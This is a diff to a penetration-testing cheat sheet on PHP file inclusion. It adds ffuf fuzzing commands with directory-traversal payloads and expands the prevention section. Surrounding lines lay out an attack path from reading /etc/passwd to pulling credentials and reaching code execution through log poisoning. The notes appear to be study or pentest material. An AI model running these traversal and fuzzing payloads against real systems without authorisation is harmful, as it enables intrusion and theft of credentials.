@@ -65,14 +65,23 @@ Test first with `?lang=http://127.0.0.1/` to confirm remote fetch works.
 
 > RFI is instant RCE when `allow_url_include` is on (test `http://127.0.0.1` first). When it's off: PHP filter to read source → upload+LFI or log poisoning to execute. Match the technique to which PHP extensions/settings are enabled (check php.ini via the base64 filter).
 
-## Find include params & files
+## Automated discovery & fuzzing
 ```bash
-ffuf -w params.txt -u "http://t/?FUZZ=/etc/passwd"      # discover the vulnerable param
-ffuf -w files.txt  -u "http://t/?lang=FUZZ"             # fuzz include targets
+# hidden params (then test each for LFI) — -fs filters the baseline size
+ffuf -w SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://t/index.php?FUZZ=value' -fs <baseline>
+# LFI payload wordlist
+ffuf -w SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://t/index.php?language=FUZZ' -fs <baseline>
+# find webroot / config / log paths to include
+ffuf -w SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://t/?language=../../../../FUZZ/index.php' -fs <baseline>
 ```
+Tools (mostly dated, Python2): LFISuite, liffy, LFiFreak — verify results manually. **Automated scanning never replaces manual testing**; complex bypasses/WAF evasion need hand-crafted payloads.
 
-## Fix
-Whitelist allowed files (not user input → path), disable `allow_url_include`/`allow_url_fopen`, sanitize `../`, least-privilege file perms, store sensitive files outside webroot.
+## Fix / prevention
+- **Best defense: don't put user input into include paths.** Load assets by a fixed map, not a parameter.
+- **Whitelist** allowed values → specific files (DB lookup / case-match / JSON map).
+- **Stop traversal:** use `basename()`; recursive `../` stripping (naive single-pass replace is bypassable with `....//`).
+- **PHP config:** `allow_url_fopen=Off`, `allow_url_include=Off`, `open_basedir` to sandbox file access, disable `expect`/risky modules.
+- **Defense in depth:** WAF (ModSecurity), least privilege, patching, monitoring/IDS, store sensitive files outside the webroot.
 
 > LFI ladder: read `/etc/passwd` to confirm → `php://filter` to pull source/creds → escalate to RCE via log poisoning or a data/input wrapper. The base64 filter is the key trick — it lets you read PHP that would otherwise just execute.
 
